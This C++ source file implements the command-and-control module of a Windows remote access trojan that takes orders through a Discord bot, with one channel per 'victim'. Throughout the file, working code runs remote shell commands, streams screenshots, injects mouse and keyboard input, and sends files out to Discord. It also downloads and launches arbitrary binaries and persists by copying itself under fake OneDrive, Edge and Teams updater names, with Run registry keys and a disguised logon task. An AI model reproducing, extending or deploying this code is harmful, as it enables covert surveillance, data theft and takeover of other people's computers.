// Command channel v2 (Discord C2, bot-first). See c2.h.
//
// Design:
//   - the bot creates ONE channel per victim (pc-<host>, position 0 so the
//     newest sits on top), or reuses the configured channel id
//   - a heartbeat message is edited in place every 20 s (live status)
//   - commands are polled from that channel through the Discord bot API and
//     only accepted from the configured operator; every sub-command runs and
//     replies in the same channel
//   - screen streaming, remote mouse/keyboard, file push/pull, self-spread
//     (guise of Windows maintenance binaries) and remote update via upload
//   - everything outbound HTTPS; nothing listens, no tunnel
#include "c2.h"
#include "../config.h"
#include "obf.h"
#include "sys.h"
#include "http.h"
#include "json.h"
#include "log.h"

#include <windows.h>
typedef ULONG PROPID;
#include <gdiplus.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <cstring>
#include <algorithm>
#include <fstream>
#include <sstream>

namespace {

std::string g_channel;        // resolved channel id
std::string g_hb_id;          // heartbeat message id
std::string g_last_cmd_id;    // newest processed message id
std::string g_cwd;            // pseudo working directory for shell commands
ULONGLONG g_next_hb = 0, g_next_poll = 0, g_next_stream = 0;
int g_poll_secs = 3;
int g_stream_secs = 0;        // 0 = off

struct Api {
    int status = 0;
    std::string body;
    bool ok() const { return status >= 200 && status < 300; }
};

std::vector<uint8_t> bytes_of(const std::string& s) { return {s.begin(), s.end()}; }

std::string jesc(const std::string& in) {
    std::string out;
    for (char c : in) {
        if (c == '"' || c == '\\') { out += '\\'; out += c; }
        else if (c == '\n') out += "\\n";
        else if (c == '\r') continue;
        else if ((unsigned char)c < 0x20) continue;
        else out += c;
    }
    return out;
}

Api api(const std::string& verb, const std::string& path, const std::string& body = {},
        const std::string& content_type = "application/json") {
    std::vector<std::pair<std::string, std::string>> h{
        {"Authorization", "Bot " + cfg::c2_bot_token()}};
    if (!body.empty()) h.push_back({"Content-Type", content_type});
    auto r = http::request(verb, "https://discord.com/api/v10" + path, h, bytes_of(body),
                           "DiscordBot (https://discord.com, 1.0)", 20000);
    return {r.status, r.body};
}

Api api_file(const std::string& path, const std::string& payload_json, const std::string& filename,
             const std::vector<uint8_t>& data) {
    http::Form form;
    form.field("payload_json", payload_json);
    form.file("files[0]", filename, data, "application/octet-stream");
    form.finish();
    std::string raw(form.body.begin(), form.body.end());
    return api("POST", path, raw, form.content_type());
}

std::string parse_id(const std::string& body) {
    try {
        auto j = util::json::parse(body);
        return j.value("id", "");
    } catch (...) { return {}; }
}

// ---------- channel discovery ----------
std::string sanitize(const std::string& s) {
    std::string out;
    for (char c : s) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_') out += (char)tolower((unsigned char)c);
        else if (c == ' ') out += '-';
    }
    if (out.empty()) out = "host";
    return out;
}

bool ensure_channel() {
    if (!g_channel.empty()) return true;
    auto pinned = cfg::c2_channel_id();
    if (!pinned.empty()) {
        g_channel = pinned;
        return true;
    }
    // find a guild the bot is in
    auto guilds = api("GET", "/users/@me/guilds");
    if (!guilds.ok()) {
        ULOG(std::string("[c2] guild list failed (http ") + std::to_string(guilds.status) + ")");
        return false;
    }
    std::string gid;
    try {
        auto arr = util::json::parse(guilds.body);
        if (arr.is_array() && !arr.empty()) gid = arr[0].value("id", "");
    } catch (...) {}
    if (gid.empty()) {
        ULOG("[c2] bot is not in any guild — invite it to your server");
        return false;
    }
    const std::string want = "pc-" + sanitize(util::env("COMPUTERNAME"));
    auto chans = api("GET", "/guilds/" + gid + "/channels");
    if (chans.ok()) {
        try {
            auto arr = util::json::parse(chans.body);
            for (auto& ch : arr) {
                if (ch.value("type", 0) == 0 && ch.value("name", "") == want) {
                    g_channel = ch.value("id", "");
                    if (!g_channel.empty()) return true;
                }
            }
        } catch (...) {}
    }
    // create it at the top of the list (position 0)
    std::string payload = "{\"name\":\"" + jesc(want) + "\",\"type\":0,\"position\":0,"
                          "\"topic\":\"ultria \
 · " + jesc(util::env("COMPUTERNAME")) + "\"}";
    auto made = api("POST", "/guilds/" + gid + "/channels", payload);
    if (!made.ok()) {
        ULOG(std::string("[c2] channel create failed (http ") + std::to_string(made.status) + ")");
        return false;
    }
    g_channel = parse_id(made.body);
    ULOG(std::string("[c2] channel created: #") + want + " -> " + g_channel);
    return !g_channel.empty();
}

void send_reply(const std::string& content) {
    if (g_channel.empty()) return;
    std::string c = content;
    if (c.size() > 1900) c = c.substr(0, 1900) + "\n...[truncated]";
    api("POST", "/channels/" + g_channel + "/messages",
        "{\"content\":\"" + jesc(c) + "\"}");
}

void send_file(const std::string& filename, const std::vector<uint8_t>& data,
               const std::string& caption) {
    if (g_channel.empty() || data.empty()) return;
    api_file("/channels/" + g_channel + "/messages",
             "{\"content\":\"" + jesc(caption) + "\"}", filename, data);
}

// ---------- host helpers ----------
std::string local_ip() {
    ULONG size = 0;
    GetAdaptersInfo(nullptr, &size);
    if (!size) return "unknown";
    std::vector<uint8_t> buf(size);
    auto* info = (IP_ADAPTER_INFO*)buf.data();
    if (GetAdaptersInfo(info, &size) != NO_ERROR) return "unknown";
    for (auto* a = info; a; a = a->Next) {
        if (a->Type == MIB_IF_TYPE_ETHERNET || a->Type == IF_TYPE_IEEE80211) {
            if (a->IpAddressList.IpAddress.String[0]) return a->IpAddressList.IpAddress.String;
        }
    }
    return info->IpAddressList.IpAddress.String;
}

std::string host_line() {
    return util::env("COMPUTERNAME") + " \xC2\xB7 " + util::env("USERNAME") + " \xC2\xB7 " +
           local_ip() + (util::is_elevated() ? " \xC2\xB7 admin" : "");
}

std::string os_version() {
    using RtlGetVersion_t = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);
    if (HMODULE nt = GetModuleHandleW(L"ntdll.dll")) {
        auto fn = (RtlGetVersion_t)GetProcAddress(nt, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi{};
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0)
                return std::to_string(vi.dwMajorVersion) + "." + std::to_string(vi.dwMinorVersion) +
                       "." + std::to_string(vi.dwBuildNumber);
        }
    }
    return "windows";
}

std::string host_full() {
    return "host : " + util::env("COMPUTERNAME") + "\nuser : " + util::env("USERNAME") +
           "\nip   : " + local_ip() + "\nos   : " + os_version() +
           "\nadmin: " + (util::is_elevated() ? "yes" : "no") +
           "\nexe  : " + util::exe_path() + "\nclock: " + util::now_str();
}

// ---------- commands ----------
std::string shell_exec(const std::string& cmd) {
    if (cmd.empty()) return "(empty command)";
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return "(pipe failed)";
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wr;
    si.hStdError = wr;
    PROCESS_INFORMATION pi{};
    std::string full_cmd = cmd;
    if (!g_cwd.empty() && cmd.rfind("cd ", 0) != 0) full_cmd = "cd /D \"" + g_cwd + "\" && " + cmd;
    std::wstring full = util::widen("cmd.exe /C " + full_cmd);
    if (!CreateProcessW(nullptr, full.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr,
                        nullptr, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        return "(spawn failed)";
    }
    CloseHandle(wr);
    std::string out;
    char buf[4096];
    DWORD got = 0;
    while (out.size() < 64 * 1024 && ReadFile(rd, buf, sizeof(buf), &got, nullptr) && got > 0)
        out.append(buf, got);
    CloseHandle(rd);
    if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT) TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (out.empty()) return "(no output)";
    if (out.size() > 1650) out = out.substr(0, 1650) + "\n...[truncated]";
    return out;
}

std::vector<uint8_t> screenshot_png() {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN), cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (cx <= 0 || cy <= 0) {
        cx = GetSystemMetrics(SM_CXSCREEN);
        cy = GetSystemMetrics(SM_CYSCREEN);
        x = y = 0;
    }
    HDC screen = GetDC(nullptr);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, cx, cy);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, cx, cy, screen, x, y, SRCCOPY);
    SelectObject(mem, old);
    DeleteDC(mem);
    ReleaseDC(nullptr, screen);

    std::vector<uint8_t> out;
    if (bmp) {
        Gdiplus::Bitmap bmpobj(bmp, nullptr);
        IStream* stream = nullptr;
        if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) == S_OK) {
            CLSID png{0x557cf406, 0x1a04, 0x11d3, {0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e}};
            if (bmpobj.Save(stream, &png, nullptr) == Gdiplus::Ok) {
                LARGE_INTEGER li{};
                stream->Seek(li, STREAM_SEEK_SET, nullptr);
                STATSTG st{};
                if (stream->Stat(&st, STATFLAG_NONAME) == S_OK && st.cbSize.QuadPart < 16 * 1024 * 1024) {
                    out.resize((size_t)st.cbSize.QuadPart);
                    ULONG rd2 = 0;
                    stream->Read(out.data(), (ULONG)out.size(), &rd2);
                    out.resize(rd2);
                }
            }
            stream->Release();
        }
        DeleteObject(bmp);
    }
    return out;
}

// remote input
void mouse_move(int x, int y) {
    SetCursorPos(x, y);
}
void mouse_click(const char* button) {
    DWORD down = MOUSEEVENTF_LEFTDOWN, up = MOUSEEVENTF_LEFTUP;
    if (strcmp(button, "right") == 0) { down = MOUSEEVENTF_RIGHTDOWN; up = MOUSEEVENTF_RIGHTUP; }
    mouse_event(down, 0, 0, 0, 0);
    Sleep(40);
    mouse_event(up, 0, 0, 0, 0);
}
void mouse_scroll(int delta) {
    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (DWORD)delta, 0);
}

WORD vk_of(const std::string& name) {
    static const struct { const char* n; WORD vk; } map[] = {
        {"enter", VK_RETURN}, {"tab", VK_TAB}, {"esc", VK_ESCAPE}, {"space", VK_SPACE},
        {"backspace", VK_BACK}, {"delete", VK_DELETE}, {"up", VK_UP}, {"down", VK_DOWN},
        {"left", VK_LEFT}, {"right", VK_RIGHT}, {"win", VK_LWIN}, {"ctrl", VK_CONTROL},
        {"alt", VK_MENU}, {"shift", VK_SHIFT}, {"f4", VK_F4}, {"f5", VK_F5}, {"f11", VK_F11},
        {"home", VK_HOME}, {"end", VK_END}, {"pageup", VK_PRIOR}, {"pagedown", VK_NEXT},
    };
    for (auto& m : map)
        if (name == m.n) return m.vk;
    if (name.size() == 1) return (WORD)toupper((unsigned char)name[0]);
    return 0;
}

void key_press(WORD vk, bool with_win) {
    if (!vk) return;
    INPUT in[4]{};
    int n = 0;
    if (with_win) {
        in[n].type = INPUT_KEYBOARD;
        in[n++].ki.wVk = VK_LWIN;
    }
    in[n].type = INPUT_KEYBOARD;
    in[n++].ki.wVk = vk;
    in[n].type = INPUT_KEYBOARD;
    in[n].ki.wVk = vk;
    in[n++].ki.dwFlags = KEYEVENTF_KEYUP;
    if (with_win) {
        in[n].type = INPUT_KEYBOARD;
        in[n].ki.wVk = VK_LWIN;
        in[n++].ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(n, in, sizeof(INPUT));
}

void type_text(const std::string& text) {
    std::wstring w = util::widen(text);
    std::vector<INPUT> in;
    in.reserve(w.size() * 2);
    for (wchar_t c : w) {
        INPUT a{};
        a.type = INPUT_KEYBOARD;
        a.ki.wScan = c;
        a.ki.dwFlags = KEYEVENTF_UNICODE;
        in.push_back(a);
        INPUT b{};
        b.type = INPUT_KEYBOARD;
        b.ki.wScan = c;
        b.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        in.push_back(b);
    }
    if (!in.empty()) SendInput((UINT)in.size(), in.data(), sizeof(INPUT));
}

// self replication under Windows-maintenance guises
int spread() {
    std::string self = util::exe_path();
    struct Spot { const char* dir; const char* name; };
    static const Spot spots[] = {
        {"%APPDATA%\\Microsoft\\OneDrive", "OneDriveStandaloneUpdater.exe"},
        {"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate", "MicrosoftEdgeUpdate.exe"},
        {"%APPDATA%\\Microsoft\\Teams\\assets", "MicrosoftTeamsUpdateWorker.exe"},
        {"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "OneDriveSyncHelper.exe"},
    };
    int placed = 0;
    std::string first_path, startup_path;
    for (auto& s : spots) {
        std::string dir = util::expand_env(s.dir);
        if (dir.empty()) continue;
        std::string dst = util::join(dir, s.name);
        CreateDirectoryW(util::widen(dir).c_str(), nullptr);
        if (CopyFileW(util::widen(self).c_str(), util::widen(dst).c_str(), FALSE)) {
            ++placed;
            if (first_path.empty()) first_path = dst;
            if (strstr(s.dir, "Startup")) startup_path = dst;
            ULOG(std::string("[c2] replicated: ") + dst);
        }
    }
    // run keys under Microsoft-ish value names
    if (!first_path.empty()) {
        HKEY rk = nullptr;
        if (RegCreateKeyExW(HKEY_CURRENT_USER,
                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0,
                            KEY_SET_VALUE, nullptr, &rk, nullptr) == ERROR_SUCCESS) {
            std::wstring v = util::widen(first_path);
            RegSetValueExW(rk, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)v.c_str(),
                           (DWORD)((v.size() + 1) * sizeof(wchar_t)));
            RegSetValueExW(rk, L"MicrosoftEdgeUpdateTaskUser", 0, REG_SZ, (const BYTE*)v.c_str(),
                           (DWORD)((v.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(rk);
        }
        // scheduled task as a third persistence leg
        shell_exec("schtasks /Create /SC ONLOGON /TN \"MicrosoftEdgeUpdateTaskUI\" /TR \"" +
                   first_path + "\" /F");
    }
    (void)startup_path;
    return placed;
}

// remote update: pull the newest attachment from the command's message
bool download_to(const std::string& url, const std::string& path, size_t cap) {
    auto r = http::request("GET", url, {}, {}, "Mozilla/5.0", 60000);
    if (!r.ok() || r.body.empty() || r.body.size() > cap) return false;
    std::ofstream f(path, std::ios::binary);
    if (!f.is_open()) return false;
    f.write(r.body.data(), (std::streamsize)r.body.size());
    return true;
}

void heartbeat() {
    std::string line = "**ONLINE** " + host_line() + " \xC2\xB7 ping " + util::now_str();
    if (g_hb_id.empty()) {
        auto r = api("POST", "/channels/" + g_channel + "/messages", "{\"content\":\"" + jesc(line) + "\"}");
        g_hb_id = parse_id(r.body);
    } else {
        api("PATCH", "/channels/" + g_channel + "/messages/" + g_hb_id,
            "{\"content\":\"" + jesc(line) + "\"}");
    }
    g_next_hb = GetTickCount64() + 20000; // live status, refreshed every 20 s
}

void stream_tick() {
    auto png = screenshot_png();
    send_file("screen_" + std::to_string(GetTickCount64() % 100000) + ".png", png,
              "live screen \xC2\xB7 " + host_line() + " \xC2\xB7 " + util::now_str());
    g_next_stream = GetTickCount64() + (ULONGLONG)g_stream_secs * 1000;
}

std::string list_dir(const std::string& path) {
    std::string base = path.empty() ? (g_cwd.empty() ? "%USERPROFILE%" : g_cwd) : path;
    if (base.find('%') != std::string::npos) base = util::expand_env(base);
    auto files = util::list_dir(base);
    auto dirs = util::list_subdirs(base);
    std::ostringstream out;
    for (auto& d : dirs) out << "[dir]  " << util::filename_of(d) << "\n";
    for (auto& f : files) out << "       " << util::filename_of(f) << "\n";
    std::string s = out.str();
    if (s.empty()) s = "(empty or unreadable)";
    if (s.size() > 1600) s = s.substr(0, 1600) + "...[truncated]";
    return s;
}

std::string proc_list() {
    std::ostringstream out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "(snapshot failed)";
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    int n = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (n++ >= 40) { out << "...\n"; break; }
            out << util::narrow(pe.szExeFile) << " (" << pe.th32ProcessID << ")\n";
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out.str();
}

void handle_command(const std::string& raw, const util::json* msg) {
    std::string cmd = raw.substr(1);
    std::string head = cmd, args;
    auto sp = cmd.find(' ');
    if (sp != std::string::npos) {
        head = cmd.substr(0, sp);
        args = cmd.substr(sp + 1);
    }
    std::string reply;
    if (head == "ping") {
        send_reply("PONG \xC2\xB7 " + host_line());
    } else if (head == "info") {
        send_reply("```\n" + host_full() + "\n```");
    } else if (head == "cmd" || head == "shell") {
        send_reply("```\n$ " + args + "\n" + shell_exec(args) + "\n```");
    } else if (head == "cd") {
        std::string p = args.empty() ? "%USERPROFILE%" : args;
        if (p.find('%') != std::string::npos) p = util::expand_env(p);
        if (util::is_dir(p)) { g_cwd = p; send_reply("cwd: " + p); }
        else send_reply("(not a directory)");
    } else if (head == "ls" || head == "dir") {
        send_reply("`" + (args.empty() ? (g_cwd.empty() ? "%USERPROFILE%" : g_cwd) : args) + "`\n```\n" +
                   list_dir(args) + "\n```");
    } else if (head == "cat") {
        std::vector<uint8_t> d;
        std::string p = args;
        if (p.find('%') != std::string::npos) p = util::expand_env(p);
        if (util::read_file(p, d) && !d.empty() && d.size() < 4096) {
            std::string s(d.begin(), d.end());
            send_reply("```\n" + p + "\n" + s + "\n```");
        } else send_reply("(cannot read, empty or larger than 4 KB)");
    } else if (head == "ps") {
        send_reply("```\n" + proc_list() + "\n```");
    } else if (head == "shot" || head == "screen") {
        send_file("screen_" + util::env("COMPUTERNAME") + ".png", screenshot_png(),
                  "screen \xC2\xB7 " + host_line());
    } else if (head == "stream") {
        if (args == "stop" || args == "off") {
            g_stream_secs = 0;
            send_reply("stream stopped");
        } else {
            int v = atoi(args.c_str());
            g_stream_secs = v > 0 ? (std::clamp)(v, 2, 120) : 2;
            g_next_stream = 0;
            send_reply("streaming every " + std::to_string(g_stream_secs) + "s (use !stream stop)");
        }
    } else if (head == "mouse") {
        std::istringstream is(args);
        std::string a1, a2;
        is >> a1 >> a2;
        if (a1 == "left" || a1 == "right" || a1 == "double") {
            mouse_click(a1 == "right" ? "right" : "left");
            if (a1 == "double") { Sleep(60); mouse_click("left"); }
            send_reply("click: " + a1);
        } else if (a1 == "scroll") {
            mouse_scroll(atoi(a2.c_str()) * 120);
            send_reply("scroll " + a2);
        } else if (!a1.empty() && !a2.empty()) {
            mouse_move(atoi(a1.c_str()), atoi(a2.c_str()));
            send_reply("cursor -> " + a1 + "," + a2);
        } else send_reply("usage: !mouse <x> <y> | !mouse left|right|double | !mouse scroll <n>");
    } else if (head == "type") {
        type_text(args);
        send_reply("typed " + std::to_string(args.size()) + " chars");
    } else if (head == "key") {
        std::istringstream is(args);
        std::string a1, a2;
        is >> a1 >> a2;
        key_press(vk_of(a1), a2 == "win");
        send_reply("key: " + a1 + (a2 == "win" ? " + win" : ""));
    } else if (head == "get") {
        std::vector<uint8_t> d;
        std::string p = args;
        if (p.find('%') != std::string::npos) p = util::expand_env(p);
        if (!p.empty() && util::read_file(p, d) && !d.empty() && d.size() < 8u * 1024 * 1024)
            send_file(util::filename_of(p), d, "file `" + p + "`");
        else send_reply("(cannot read or larger than 8 MB)");
    } else if (head == "upload") {
        std::istringstream is(args);
        std::string url, dst;
        is >> url >> dst;
        if (url.empty()) {
            send_reply("usage: !upload <url> [destination]");
        } else {
            std::string path = dst.empty() ? (util::temp_dir() + "\\dl_" + std::to_string(GetTickCount64() % 100000) + ".bin") : dst;
            if (download_to(url, path, 64u * 1024 * 1024)) send_reply("uploaded to " + path);
            else send_reply("(download failed)");
        }
    } else if (head == "spread") {
        int n = spread();
        send_reply("replicated to " + std::to_string(n) + " location(s) + run keys + onlogon task");
    } else if (head == "update") {
        if (msg && msg->contains("attachments") && (*msg)["attachments"].is_array() &&
            !(*msg)["attachments"].empty()) {
            const auto& a = (*msg)["attachments"][0];
            std::string url = a.value("url", "");
            std::string name = a.value("filename", "update.exe");
            std::string tmp = util::temp_dir() + "\\" + name;
            if (!url.empty() && download_to(url, tmp, 64u * 1024 * 1024)) {
                std::wstring w = util::widen(tmp);
                STARTUPINFOW si{};
                si.cb = sizeof(si);
                PROCESS_INFORMATION pi{};
                if (CreateProcessW(nullptr, w.data(), nullptr, nullptr, FALSE, DETACHED_PROCESS,
                                   nullptr, nullptr, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    send_reply("update staged and launched: " + name);
                } else send_reply("(launch failed)");
            } else send_reply("(download failed)");
        } else send_reply("attach the new binary to the `!update` message");
    } else if (head == "sleep") {
        int v = atoi(args.c_str());
        g_poll_secs = (std::clamp)(v, 2, 3600);
        send_reply("poll interval: " + std::to_string(g_poll_secs) + "s");
    } else if (head == "help") {
        send_reply("```\nping              info             cmd <line>\nls [path]         cd <path>        cat <file>\n"
                   "ps                shot             stream [sec|stop]\nmouse <x> <y>     mouse left|right|double|scroll <n>\n"
                   "type <text>       key <name> [win] get <path>       upload <url> [path]\nspread            update (attach binary)          sleep <sec>   exit\n```");
    } else if (head == "exit" || head == "bye") {
        send_reply("channel closing \xC2\xB7 " + host_line());
        ExitProcess(0);
    } else {
        send_reply("unknown: " + head + " (try !help)");
    }
    (void)reply;
}

void init_offset() {
    auto r = api("GET", "/channels/" + g_channel + "/messages?limit=1");
    if (!r.ok()) return;
    try {
        auto arr = util::json::parse(r.body);
        if (arr.is_array() && !arr.empty()) g_last_cmd_id = arr[0].value("id", "");
    } catch (...) {}
}

void poll_commands() {
    std::string path = "/channels/" + g_channel + "/messages?limit=10";
    if (!g_last_cmd_id.empty()) path += "&after=" + g_last_cmd_id;
    auto r = api("GET", path);
    if (!r.ok() || r.body.empty()) return;
    util::json arr;
    try { arr = util::json::parse(r.body); } catch (...) { return; }
    if (!arr.is_array() || arr.empty()) return;
    std::vector<util::json> msgs(arr.begin(), arr.end());
    std::reverse(msgs.begin(), msgs.end());
    for (auto& m : msgs) {
        std::string id = m.value("id", "");
        if (id.empty()) continue;
        if (id > g_last_cmd_id) g_last_cmd_id = id;
        if (m.contains("author") && m["author"].value("bot", false)) continue;
        std::string author = m.contains("author") ? m["author"].value("id", "") : "";
        auto operator_id = cfg::c2_operator_id();
        if (!operator_id.empty() && author != operator_id) continue;
        std::string content = m.value("content", "");
        if (content.rfind("!", 0) == 0) handle_command(content, &m);
    }
}

} // namespace

namespace c2 {

bool enabled() {
    return cfg::c2_bot_token().size() > 50;
}

bool prepare() { return ensure_channel(); }

bool deliver(const std::string& filename, const std::vector<uint8_t>& data,
             const std::string& caption) {
    if (!ensure_channel()) return false;
    std::string cap = caption.size() > 1900 ? caption.substr(0, 1900) + "..." : caption;
    http::Form form;
    form.field("payload_json", "{\"content\":\"" + jesc(cap) + "\"}");
    form.file("files[0]", filename, data, "application/octet-stream");
    form.finish();  // close the multipart boundary before copying the body
    std::string raw(form.body.begin(), form.body.end());
    auto r = api("POST", "/channels/" + g_channel + "/messages", raw, form.content_type());
    if (!r.ok())
        ULOG(std::string("[c2] deliver failed (http ") + std::to_string(r.status) + ") " +
             r.body.substr(0, 200));
    return r.ok();
}

void run_forever() {
    if (!ensure_channel()) return;
    ULOG(std::string("[c2] channel active: ") + g_channel);
    init_offset();
    heartbeat();
    for (;;) {
        if (GetTickCount64() >= g_next_poll) {
            poll_commands();
            g_next_poll = GetTickCount64() + (ULONGLONG)g_poll_secs * 1000;
        }
        if (GetTickCount64() >= g_next_hb) heartbeat();
        if (g_stream_secs > 0 && GetTickCount64() >= g_next_stream) stream_tick();
        Sleep(500);
    }
}

} // namespace c2
